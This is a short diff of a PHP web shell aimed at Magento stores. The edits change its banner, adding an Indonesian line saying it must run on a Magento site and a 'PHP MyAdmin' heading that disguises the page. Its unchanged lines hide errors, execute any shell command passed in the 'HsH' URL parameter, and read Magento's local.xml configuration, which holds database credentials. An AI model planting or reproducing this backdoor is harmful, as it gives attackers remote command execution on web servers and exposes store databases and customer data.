@@ -1,4 +1,4 @@
-
+ 
 <?php
 @session_start();
 @error_reporting(0);
@@ -13,11 +13,12 @@
 	<br>
 	<FORM action=""  method="post">
 	<div align="center"><br>
-	<div align="center">============================[    PHP MyAdmin    ]============================<br><br>
+	<div align="center"><span><font color=lime><p class="blink">Harus Di Jalankan Pada Web Magento</p></font></span> <br><br>
 	<input type="hidden" name="form_action" value="2">
 	</div>
 	</div>
 	';
+echo'<div align="center">============================[    PHP MyAdmin    ]============================<br><br>';
 	if($_GET['HsH']){echo"<pre>".shell_exec($_GET["HsH"]);}
 	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml')){
 		$xml = simplexml_load_file($_SERVER['DOCUMENT_ROOT'].'/app/etc/local.xml');
